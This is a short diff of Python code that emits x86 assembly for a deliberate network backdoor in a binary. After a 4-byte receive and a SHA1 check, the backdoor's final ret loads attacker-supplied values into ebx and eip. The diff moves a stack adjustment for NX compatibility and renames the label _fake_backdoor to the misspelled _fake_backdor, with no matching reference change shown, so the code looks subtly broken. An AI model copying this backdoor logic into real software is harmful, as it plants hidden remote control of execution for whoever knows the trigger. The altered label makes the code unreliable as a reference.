@@ -197,8 +197,6 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
 
         code = code_header + '''
             _enter_backddor:
-            ; makes the backdoor compatible with nx
-            sub esp, 0x1000
 
             ; we do not check rx_bytes: the assumption is that the network will never split the 4 bytes we send 
             ; I think it is a correct assumption because on the pov side we send 4 bytes together and 4 is very small
@@ -238,6 +236,8 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
             ; in between push <code>, push esp and the final ret I put all the code for the backdoor logic
             ; so that an attacker cannot use push <code>, push esp without actually executing the backdoor code
             _real_backdoor:
+                ; make the backdoor compatible with nx
+                sub esp, 0x1000
 
                 sub esp, 0x64 ; space for sha1 MESSAGE
                 ; clear the memory here (otherwise you get nasty bugs depending on the frames on the stack!)
@@ -330,7 +330,10 @@ __attribute__((fastcall)) int SHA1(int MESSAGE[] )
                 ; magically ret will jump to the stack, executing pop, pop, ret (setting ebx, eip to the sent values)
                 ret
 
-            _fake_backdoor:
+            _fake_backdor:
+                ; make the backdoor compatible with nx
+                sub esp, 0x1000
+
                 ; set the stack as in the real backdoor
                 push 0xc35b5990 ; pop ecx, pop ebx, ret, nop: pop ecx is used to clean [esp] from the stack
                 push esp
